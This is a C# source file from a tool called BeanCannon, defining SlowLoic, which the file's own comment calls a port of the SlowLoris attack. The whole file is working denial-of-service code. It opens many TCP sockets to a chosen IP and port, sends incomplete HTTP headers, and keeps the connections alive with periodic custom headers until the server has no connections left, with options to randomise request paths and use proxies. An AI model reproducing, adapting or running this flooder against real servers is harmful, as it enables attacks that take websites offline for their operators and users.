using BeanCannon.BusinessLogic.Core.Attacks.Settings;
using BeanCannon.BusinessLogic.Core.Extensions;
using BeanCannon.BusinessLogic.Core.Factory;
using BeanCannon.BusinessLogic.Core.Net;
using BeanCannon.BusinessLogic.Core.Net.Interfaces;
using BeanCannon.BusinessLogic.Core.Randomizers;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;

namespace BeanCannon.BusinessLogic.Core.Attacks
{
	/// <summary>
	/// SlowLoic is the port of RSnake's SlowLoris
	/// </summary>
	public class SlowLoic : BaseFlooder<SlowLoicSettings>
	{
		private List<ISocket> socketsList = new List<ISocket>();

		public SlowLoic(SlowLoicSettings settings) : base(settings)
		{
			this.State.IsDelayed = true;
		}

		protected override void OnDoWorkEvent(object sender, DoWorkEventArgs e)
		{
			try
			{
				// header set-up
				byte[] headerBuffer = new FluentHeaderBuilder()
					.AddMethod(Settings.UrlPath, Settings.HttpRequestMethod)
					.Add(HttpRequestHeader.Host, Settings.Host)
					.Add(HttpRequestHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)")
					.Add(HttpRequestHeader.KeepAlive, 300)
					.Add(HttpRequestHeader.Connection, "keep-alive")
					.Add(HttpRequestHeader.ContentLength, 42)
					.AddConditional(HttpRequestHeader.AcceptEncoding, "gzip,deflate", Settings.AllowGzip)
					.BuildAsByteArray();

				byte[] xHeaderBuffer = new FluentHeaderBuilder()
					.AddCustom("X-a", "b")
					.BuildAsByteArray();

				DateTime stop = DateTime.UtcNow;
				IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(Settings.Ip), Settings.Port);

				State.Status = RequestStatus.Ready;
				while (State.IsFlooding)
				{
					stop = DateTime.UtcNow + Settings.Timeout;
					State.Status = RequestStatus.Connecting; // SET STATE TO CONNECTING //

					// we have to do this really slow
					while (State.IsFlooding && State.IsDelayed && DateTime.UtcNow < stop)
					{
						if (Settings.UseRandomPath == true)
						{
							headerBuffer = new FluentHeaderBuilder()
								.AddMethod($"{Settings.UrlPath}{RandomizerHq.RandomString()}", Settings.HttpRequestMethod)
								.Add(HttpRequestHeader.Host, Settings.Host)
								.Add(HttpRequestHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)")
								.Add(HttpRequestHeader.KeepAlive, 300)
								.Add(HttpRequestHeader.Connection, "keep-alive")
								.Add(HttpRequestHeader.ContentLength, 42)
								.AddConditional(HttpRequestHeader.AcceptEncoding, "gzip,deflate", Settings.AllowGzip)
								.BuildAsByteArray();
						}

						ISocket socket = SocketFactory.Instance.GetSocket(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp, Settings.ProxyConnectionType);
						try
						{
							socket.WrappedConnect(endPoint);
							socket.NoDelay = true;
							socket.Blocking = false;
							socket.Send(headerBuffer);
						}
						catch
						{ }

						if (socket.Connected)
						{
							socketsList.Add(socket);
							State.Requested++;
						}

						State.IsDelayed = (socketsList.Count < Settings.SocketsPerThread);
						if (State.IsFlooding && State.IsDelayed)
						{
							System.Threading.Thread.Sleep(Settings.Delay);
						}
					}

					State.Status = RequestStatus.Requesting;

					if (Settings.UseRandomCommands)
					{
						xHeaderBuffer = new FluentHeaderBuilder()
							.AddCustom("X-a", $"b{RandomizerHq.RandomString()}")
							.BuildAsByteArray();
					}

					// keep the sockets alive
					for (int i = (socketsList.Count - 1); State.IsFlooding && i >= 0; i--)
					{
						try
						{
							if (!socketsList[i].Connected || (socketsList[i].Send(xHeaderBuffer) <= 0))
							{
								socketsList.RemoveAt(i);
								State.Failed++;
								State.Requested--; // the "requested" number in the stats shows the actual open sockets
							}
							else
							{
								State.Downloaded++; // this number is actually BS .. but we wanna see sth happen :D
							}
						}
						catch
						{
							socketsList.RemoveAt(i);
							State.Failed++;
							State.Requested--;
						}
					}

					State.Status = RequestStatus.Completed;
					State.IsDelayed = (socketsList.Count < Settings.SocketsPerThread);

					if (!State.IsDelayed)
					{
						System.Threading.Thread.Sleep(Settings.Timeout);
					}
				}
			}
			catch
			{
				State.Status = RequestStatus.Failed;
			}
			finally
			{
				State.IsFlooding = false;

				// not so sure about the graceful shutdown ... but why not?
				for (int i = (socketsList.Count - 1); i >= 0; i--)
				{
					try
					{
						socketsList[i].Close();
					}
					catch { }
				}

				socketsList.Clear();
				State.Status = RequestStatus.Ready;
				State.IsDelayed = true;
			}
		}
	} // class SlowLoic
}
